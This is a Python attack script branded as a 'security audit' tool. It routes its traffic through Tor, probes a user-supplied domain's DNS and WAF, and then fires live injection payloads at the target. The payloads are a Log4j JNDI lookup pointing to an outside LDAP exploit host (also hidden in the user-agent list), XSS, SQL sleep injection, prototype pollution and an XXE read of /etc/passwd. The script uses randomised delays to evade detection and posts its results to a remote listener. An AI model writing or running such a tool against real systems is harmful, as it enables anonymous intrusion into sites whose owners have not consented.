import requests
import json
import time
import random
import os
import socket
import dns.resolver
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# Configuration for Data Destinations
LOCAL_REPORT_PATH = "/home/qenmity/py/fromdasttodiscovery/results.json"
REMOTE_LISTENER_URL = "http://100.115.92.202:4444"
# SOCKS5 Proxy Configuration (Tor Default)
PROXIES = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

class ZaxkerothAudit:
    def __init__(self):
        self.version = "2.0-Elite-Bundle"
        self.session = requests.Session()
        # Use socks5h to ensure DNS resolution happens on the proxy side (Prevents DNS Leaks)
        self.session.proxies.update(PROXIES)
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            # JNDI/Log4j Probe
            "${${::-j}${::-n}${::-d}${::-i}:ldap://198.185.165.105:1389/Exploit}" 
        ]
        
        self.banner = rf"""
{Fore.RED}########################################################
#          ZAXKEROTH SECURITY AUDIT v2.0               #
#    {Fore.WHITE}Research - Defense - Education - Training{Fore.RED}         #
########################################################
{Style.RESET_ALL}
[!] LEGAL: This tool is for authorized security auditing.
[!] PRIVACY: All traffic routed via SOCKS5h (DNS Leak Protection).
"""

    def display_ui(self):
        print(self.banner)

    # --- Stage 1: Discovery (DNS & MX) ---
    def run_discovery(self, domain):
        print(f"\n{Fore.BLUE}[*] Stage 1: Infrastructure & MX Audit")
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in answers:
                print(f"{Fore.YELLOW}[!] ACTIVE MAIL SERVER: {rdata.exchange}")
        except: print(f"{Fore.RED}[-] MX Record Lookup Failed.")
        
        try:
            ip = socket.gethostbyname(domain)
            print(f"{Fore.GREEN}[+] Target IP Resolved: {ip}")
            return ip
        except: return None

    # --- Stage 2: WAF & Challenge Analysis ---
    def detect_waf_challenges(self, url):
        print(f"\n{Fore.BLUE}[*] Stage 2: WAF & Anti-Bot Detection")
        try:
            # First request to check for DataDome/Cloudflare
            response = self.session.get(url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=15)
            if "datadome" in response.text.lower() or "x-datadome" in response.headers:
                print(f"{Fore.RED}[!] DataDome WAF Detected. 403 Forbidden Response.")
                choice = input(f"{Fore.YELLOW}[!]: Challenges found. Proceed with automated tests? [Y/q]: ")
                return choice.lower() == 'y'
            return True
        except Exception as e:
            print(f"{Fore.RED}[X] Connection Error (Check if Tor is running): {e}")
            return False

    # --- Stage 3: Automated Payloads (XSS, SQLi, JNDI, Proto-Pollution) ---
    def run_automated_tests(self, url):
        print(f"\n{Fore.RED}[*] Stage 3: Automated Payload Injection (Non-Malicious)")
        findings = []
        
        # Consolidating your requested test vectors
        test_vectors = [
            {"name": "JNDI/Log4j", "header": "User-Agent", "value": "${jndi:ldap://198.185.165.105:1389/Exploit}"},
            {"name": "XSS-SVG", "header": "Referer", "value": "\"><svg/onload=alert(1)"},
            {"name": "SQLi-Sleep", "body": {"s": "' OR (SELECT SLEEP(5))=0--"}},
            {"name": "Proto-Pollution", "body": {"__proto__": {"isPolluted": "true"}}},
            {"name": "XXE-Passwd", "body": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}
        ]

        for test in test_vectors:
            print(f"{Fore.YELLOW}[*] Testing {test['name']}...")
            time.sleep(random.uniform(2, 5)) # Human-like delay
            
            try:
                headers = {"Referer": url, "Content-Type": "application/json"}
                # Apply header-based tests
                if "header" in test:
                    headers[test['header']] = test['value']
                
                # Execute POST request (Automating your curl example)
                res = self.session.post(url, headers=headers, json=test.get("body", {}), timeout=15)
                
                if res.status_code == 200:
                    print(f"{Fore.GREEN}[+] Potential Hit: Server accepted {test['name']}")
                    findings.append(test)
                else:
                    print(f"{Fore.CYAN}[-] Blocked by WAF (Status {res.status_code})")
            except: pass

        self.finalize(url, findings)

    def finalize(self, target, findings):
        report = {"timestamp": time.ctime(), "target": target, "results": findings}
        
        # 1. Save Local Report
        try:
            os.makedirs(os.path.dirname(LOCAL_REPORT_PATH), exist_ok=True)
            with open(LOCAL_REPORT_PATH, 'w') as f:
                json.dump(report, f, indent=4)
            print(f"\n{Fore.GREEN}[+] Report saved locally to {LOCAL_REPORT_PATH}")
        except: pass

        # 2. Transmit to Listener (Metasploit/Remote)
        try:
            print(f"{Fore.BLUE}[*] Transmitting results to {REMOTE_LISTENER_URL}")
            requests.post(REMOTE_LISTENER_URL, json=report, timeout=5)
        except: print(f"{Fore.YELLOW}[!] Remote listener unreachable.")

    def start(self):
        self.display_ui()
        domain = input("Enter target domain (e.g., example.com): ")
        self.run_discovery(domain)
        if self.detect_waf_challenges(f"https://{domain}"):
            self.run_automated_tests(f"https://{domain}")

if __name__ == "__main__":
    ZaxkerothAudit().start()
